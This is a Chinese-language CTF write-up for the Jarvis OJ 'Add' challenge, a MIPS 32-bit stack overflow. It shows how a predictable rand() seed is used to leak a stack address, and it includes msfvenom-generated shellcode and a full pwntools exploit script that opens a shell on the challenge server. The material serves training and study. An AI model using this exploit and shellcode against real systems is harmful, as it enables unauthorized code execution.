---
title: Jarvis OJ - Add の Write-Up
date: 2021-01-28 13:35:37
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
- MIPS
---
## Introduction

&emsp;&emsp;Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。

<!-- more -->

## Step 1

&emsp;&emsp;checksec发现是MIPS架构的32位程序：

![](/img/Add/Add1.png)

&emsp;&emsp;连接到服务器端看下程序运行逻辑：

![](/img/Add/Add2.png)

&emsp;&emsp;看起来是个简单的加法计算器。

## Step 2

&emsp;&emsp;Ghidra反编译看下main函数的代码：

![](/img/Add/Add3.png)

![](/img/Add/Add4.png)

&emsp;&emsp;结合retdec反编译的C代码：

![](/img/Add/Add5.png)

&emsp;&emsp;在LAB_00400b18中有这样一个片段：

![](/img/Add/Add6.png)

&emsp;&emsp;根据main函数的代码发现buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题。

&emsp;&emsp;上图中片段可以实现打印buf的地址，想要执行这个功能需要满足buf和challenge相等，buf是由我们控制的。

&emsp;&emspchallenge表面上是rand()生成的随机数，但是由于随机种子是由srand(0x123456)生成的，即为固定值，导致challenge也是固定值。

&emsp;&emsp;通过上面的分析我们可以得到栈上buf的地址，加上程序没有NX保护。所以当在buf中布置好shellcode控制程序跳转执行即可。

## Step 3

&emsp;&emsp;利用cyclic生成200个字节，通过调试发现溢出偏移量为112即0x70。这里要注意只有退出程序才会回到返回地址，所以最后需要一个退出的操作。

&emsp;&emsp;另外在调试中发现如果直接部署在buf上，在shellcode中指令会将/bin/sh字符串修改导致get shell 失败。所以需要将shellcode再偏移4或8和字节。

&emsp;&emsp;利用msfvenom生成payload：

![](/img/Add/Add7.png)

## Step 4

&emsp;&emsp;下面是PWN脚本：

```
from pwn import *
from ctypes import CDLL

sh = remote("pwn2.jarvisoj.com", 9889)

dll = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
dll.srand(0x123456)
key = dll.rand()

sh.sendlineafter("help.\n", str(key))
sh.recvuntil("Your input was")
stack_addr = int(sh.recvline().strip(), 16)

buf =  b""
buf += b"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"
buf += b"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"
buf += b"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"
buf += b"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload = '0'*4 + buf.ljust(0x70 - 4, '0') + p32(stack_addr + 4)

sh.sendline(payload)

sh.sendline('exit')

sh.interactive()
sh.close()
```

&emsp;&emsp;脚本运行结果：

![](/img/Add/Add8.png)
